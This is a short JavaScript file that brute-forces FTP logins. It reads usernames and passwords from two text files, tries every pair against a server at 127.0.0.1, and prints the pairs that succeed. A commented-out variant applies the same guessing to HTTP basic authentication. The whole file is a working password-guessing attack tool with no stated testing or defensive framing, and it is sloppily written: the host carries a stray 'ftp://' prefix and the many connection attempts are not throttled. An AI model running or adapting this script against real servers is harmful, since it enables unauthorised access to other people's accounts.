"use strict";

const readline = require("readline");
const fs = require("fs");
const jsftp = require("jsftp");

const usersReader = readline.createInterface({
    input: fs.createReadStream("users.txt")
});
let passwordReader;
usersReader.on("line", user => {
    passwordReader = readline.createInterface({
        input: fs.createReadStream("passwords.txt")
    });
    passwordReader.on("line", password => {
        sendREquest("ftp://127.0.0.1", user, password)
            .then(() => console.log(`${user} => ${password}`))
            .catch(() => {});
    });
});

function sendREquest(url, username, password) {
    const Ftp = new jsftp({
        host: url,
        port: 21,
        user: username,
        pass: password
    });

    return new Promise((resolve, reject) => {
        Ftp.auth(username, password, (err, res) => {
            if(err) {
                reject();
            }
            else {
                resolve();
            }
        });
    });

    // return new Promise((resolve, reject) => {
    //     request.get(url, {
    //         auth: {
    //             user: username,
    //             pass: password,
    //             sendImmediately: false
    //         }
    //     }).on("response", (response) => {
    //         if (response.statusCode === 200) {
    //             resolve();
    //         } else {
    //             reject();
    //         }
    //     })
    // });
}